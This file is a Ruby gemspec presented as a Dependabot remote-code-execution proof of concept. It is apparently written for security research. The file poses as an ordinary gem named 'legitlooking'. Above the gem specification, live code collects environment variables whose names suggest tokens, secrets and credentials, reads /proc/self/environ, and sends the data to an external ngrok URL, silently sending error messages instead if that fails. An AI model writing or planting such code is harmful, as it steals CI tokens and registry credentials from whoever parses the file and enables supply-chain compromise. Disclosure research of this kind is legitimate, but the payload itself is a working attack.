# frozen_string_literal: true

# ============================================================
# Dependabot RCE PoC - Finding 2: Gemspec Ruby eval
#
# Dependabot calls Bundler.load_gemspec_uncached() which
# evaluates this file as arbitrary Ruby. No sandbox.
# Triggers during the FILE PARSING phase.
#
# Replace COLLAB_URL with your Burp Collaborator / interactsh URL.
# ============================================================

COLLAB_URL = "https://854e-2001-1c00-307-d600-5943-e639-f9a6-c878.ngrok-free.app"

begin
  require "uri"
  require "net/http"

  # Collect environment variables (contains GitHub token, registry creds)
  env_data = ENV.select { |k, _|
    %w[TOKEN SECRET KEY CRED PASS AUTH GITHUB NPM GEM RUBYGEMS PYPI].any? { |kw|
      k.upcase.include?(kw)
    }
  }.to_s

  # Also grab /proc/self/environ for anything not in ENV
  proc_env = File.read("/proc/self/environ") rescue ""

  payload = [env_data, proc_env].join(" | ").slice(0, 2000)
  encoded  = URI.encode_www_form_component(payload)

  uri = URI("#{COLLAB_URL}?poc=2&data=#{encoded}")
  Net::HTTP.get(uri) rescue nil
rescue => e
  begin
    require "net/http"
    uri = URI("#{COLLAB_URL}?poc=2&err=#{URI.encode_www_form_component(e.message)}")
    Net::HTTP.get(uri)
  rescue
    # silent fallback
  end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.0"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]

  spec.add_dependency "rails", "~> 7.0.0"
  spec.add_dependency "devise", "~> 4.9.0"
end
